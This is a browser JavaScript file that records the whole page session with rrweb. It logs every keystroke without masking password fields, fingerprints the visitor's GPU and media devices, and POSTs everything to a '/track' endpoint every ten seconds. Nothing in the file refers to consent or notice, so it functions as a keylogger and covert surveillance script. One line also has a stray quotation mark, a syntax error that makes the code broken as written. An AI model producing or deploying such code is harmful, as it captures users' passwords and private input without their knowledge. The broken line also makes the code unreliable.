document.addEventListener('DOMContentLoaded', () => {
    let events = [];
    const capturedKeys = [];
    let gpuInfo = {};
    let devices = [];

    // 1. Initialize rrweb
    rrweb.record({
        emit(event) {
            events.push(event);
        },
    });

    // 2. Capture Keystrokes
    document.addEventListener('keydown', (event) => {
        capturedKeys.push({
            key: event.key,
            code: event.code,
            timestamp: new Date().toISOString()
        });
    });

    // 3. Gather GPU Info
    const getGpuInfo = () => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuInfo = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL'),
                    };
                } else {
                    gpuInfo = {
                        vendor: 'N/A',
                        renderer: 'N/A',
                        error: 'WEBGL_debug_renderer_info not supported'
                    }
                }
                 gpuInfo.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                 gpuInfo.version = gl.getParameter(gl.VERSION);

            } else {
                 gpuInfo = { error: 'WebGL not supported' };
            }
        } catch (e) {
            gpuInfo = { error: e.message };
        }
    };


    // 4. List Devices
    const getDevices = async () => {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const deviceList = await navigator.mediaDevices.enumerateDevices();
                devices = deviceList.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId,
                }));
            }
        } catch (e) {
            devices = [{ error: e.message }];
        }
    };

    // 5. Package and Send Data
    const sendData = async () => {
        // First, ensure we have the latest device and GPU info
        await getDevices();
        getGpuInfo();

        const payload = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
            },
            gpuInfo,
            devices,
            keystrokes: [...capturedKeys], // Send a copy
            session: [...events], // Send a copy
        };

        try {
            await fetch('/track', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload, null, 2),
            });

            // Clear events and keystrokes after sending to avoid duplicates
            events = [];
            capturedKeys.length = 0;

        } catch (error) {
            console.error('Error sending tracking data:', error);
        }
    };

    // Send data every 10 seconds
    setInterval(sendData, 10000);

    // Initial data capture
    getGpuInfo();
    getDevices();
});
